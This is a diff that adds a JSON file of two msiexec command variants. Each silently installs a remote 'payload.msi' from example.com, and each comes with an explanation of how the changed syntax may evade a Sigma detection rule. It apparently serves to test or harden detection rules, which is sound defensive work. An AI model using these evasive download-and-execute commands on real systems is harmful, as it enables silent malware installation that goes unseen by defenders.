@@ -1,0 +1,10 @@
+[
+  {
+    "output": "msiexec.exe /i http://example.com/payload.msi /qn",
+    "explanation": "Omission of quotes around the URL is allowed in many command-line contexts and may bypass detection if the Sigma rule relies on quoted strings for detection."
+  },
+  {
+    "output": "msiexec.exe /i http://example.com/payload.msi /quiet",
+    "explanation": "Substitution of '/qn' with '/quiet' uses equivalent syntax to achieve the same silent installation behavior, which may bypass detection if the Sigma rule does not account for both forms."
+  }
+]
